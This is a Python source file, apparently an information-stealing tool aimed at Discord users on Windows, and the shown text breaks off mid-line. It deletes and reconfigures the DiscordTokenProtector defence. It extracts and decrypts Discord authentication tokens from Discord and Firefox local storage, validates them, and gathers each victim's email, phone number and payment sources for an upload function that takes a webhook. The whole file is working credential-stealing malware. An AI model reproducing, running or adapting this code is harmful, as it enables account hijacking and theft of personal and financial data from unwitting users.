import base64
import json
import os
import re
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


baseurl = "https://discord.com/api/v9/users/@me"
appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
tokens_sent = []
tokens = []
ids = []

def killprotector(roaming):
    path = f"{roaming}\\DiscordTokenProtector"
    config = path + "config.json"
    
    if not os.path.exists(path):
        return
    
    for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
        try:
            os.remove(path + process)
        except FileNotFoundError:
            pass
    
    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420
    
        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)

def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def grabTokens(roaming, regex, encrypted_regex, baseurl):
    tokens = []
    ids = []

    paths = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        # Add other paths here...
    }

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypted_regex, line):
                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                            r = requests.get(baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    return tokens

def upload(tokens, tokens_sent, baseurl, webhook):
    for token in tokens:
        if token in tokens_sent:
            continue

        val = ""
        methods = ""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Content-Type': 'application/json',
            'Authorization': token
        }
        user = requests.get(baseurl, headers=headers).json()
        payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
        username = user['username']
        discord_id = user['id']
        avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
            if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
            else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
        phone = user['phone']
        email = user['email']

        mfa = ":white_check_mark:" if user.get

